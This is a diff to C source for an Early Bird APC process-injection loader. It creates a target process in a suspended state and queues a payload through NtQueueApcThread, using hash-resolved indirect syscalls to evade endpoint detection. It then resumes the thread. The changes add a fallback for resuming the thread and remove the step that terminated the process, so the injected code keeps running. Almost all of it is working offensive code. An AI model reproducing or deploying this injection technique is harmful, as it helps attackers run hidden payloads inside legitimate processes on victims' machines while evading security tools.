@@ -59,7 +59,7 @@ BOOL CreateSuspendedProcess(LPWSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
         NULL,
         NULL,
         FALSE,
-        DEBUG_PROCESS,  // Substitute of CREATE_SUSPENDED
+        CREATE_SUSPENDED,  // alt: DEBUG_PROCESS
         NULL,
         NULL,
         &Si,
@@ -85,7 +85,7 @@ BOOL CreateSuspendedProcess(LPWSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
 BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
 	DWORD		dwProcessId		= 0;
 	PVOID		pAddress		= NULL;
-
+    NTSTATUS	STATUS          = 0;
 
 //	creating target remote process (in debugged state)
 	DebugPrint("[i] Creating \"%ls\" Process As A Debugged Process ...\n", szProcessName);
@@ -122,8 +122,6 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 
 //	running QueueUserAPC
 #ifdef HW_INDIRECT_SYSCALL
-    NTSTATUS		STATUS = STATUS_SUCCESS;
-
     // executing the payload via NtQueueApcThread
     NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
     if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
@@ -140,12 +138,21 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 	//DebugPrint("[i] Detaching The Target Process ... ");
 	//DebugActiveProcessStop(dwProcessId);
     DebugPrint("[i] Resuming The Suspended Thread ... ");
-    NtResumeThread_t pNtResumeThread = (NtResumeThread_t)PrepareSyscall((char *)("NtResumeThread"));
+    NtResumeThread_t pNtResumeThread = (NtResumeThread_t)PrepareSyscall((char*)("NtResumeThread"));
     ULONG suspendCount = 0;
+
+#ifdef HW_INDIRECT_SYSCALL
     if ((STATUS = pNtResumeThread(hThread, &suspendCount)) != 0) {
         DebugPrint("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
         return FALSE;
     }
+#else
+    suspendCount = ResumeThread(hThread);
+	if (suspendCount == (DWORD)-1) {
+		DebugPrint("[!] ResumeThread Failed With Error: %d \n", GetLastError());
+		return FALSE;
+	}
+#endif
     DebugPrint("[+] Thread Resumed Successfully \n\n");
 
     // Optional: Wait for the injected code to execute
@@ -153,12 +160,6 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 	DebugPrint("[+] DONE \n\n");
 
 // Closing the handles to the process and thread
-    if (!TerminateProcess(hProcess, 0)) {
-        DebugPrint("[!] Failed to terminate process. Error: %d\n", GetLastError());
-    }
-    else {
-        DebugPrint("[+] Process Terminated Successfully.\n");
-    }
 	CloseHandle(hProcess);
 	CloseHandle(hThread);
 
